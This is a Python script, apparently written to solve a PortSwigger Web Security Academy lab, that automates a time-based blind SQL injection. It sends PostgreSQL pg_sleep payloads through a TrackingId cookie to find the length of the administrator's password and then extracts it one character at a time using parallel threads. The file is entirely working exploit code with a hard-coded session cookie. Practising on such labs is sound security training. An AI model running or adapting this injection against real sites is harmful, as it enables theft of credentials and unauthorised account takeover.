import concurrent.futures
import requests

def pw_length():
    
    url = "https://0a3500ca03a3f8a4801e768200e40052.web-security-academy.net/"
    for c in range(1,50):
      sql_payload = f"'%3bSELECT+CASE+WHEN+(username='administrator'+and+(LENGTH(password))>{c})+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+from users--"
      # sql_payload_encoded = urllib.parse.quote(sql_payload)
      cookies = {"TrackingId": f"tNsZdORZUgF6OTw9{sql_payload}",
                    "session": "xR87P17Z8SG8y3tj3rhxPax8Z47gEerB"}
      req = requests.get(url,cookies=cookies,verify=False)
      
      if int(req.elapsed.total_seconds()) > 9:
        return int(c)
      
def time_based_sqli(index):
    url = "https://0a3500ca03a3f8a4801e768200e40052.web-security-academy.net/"
    for c in range(32,126):
      sql_payload = f"'%3bSELECT+CASE+WHEN+(username='administrator'+and+SUBSTRING(password,{index},1)='{chr(c)}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+from users--"
      cookies = {"TrackingId": f"tNsZdORZUgF6OTw9{sql_payload}",
                    "session": "xR87P17Z8SG8y3tj3rhxPax8Z47gEerB"}
      req = requests.get(url,cookies=cookies,verify=False)
      if int(req.elapsed.total_seconds()) > 9:
        return chr(c)


def main():

    print("[*] Retreiving password...")
    password_list = []
    length = pw_length()
    print(f"password length = {length}")
    with concurrent.futures.ThreadPoolExecutor() as excecuter:
        positions = [i for i in range(1,length+1)]
        result = excecuter.map(time_based_sqli,positions)
        for c in result:
            password_list.append(c)
    print("".join(password_list))

if __name__ == "__main__":
  main()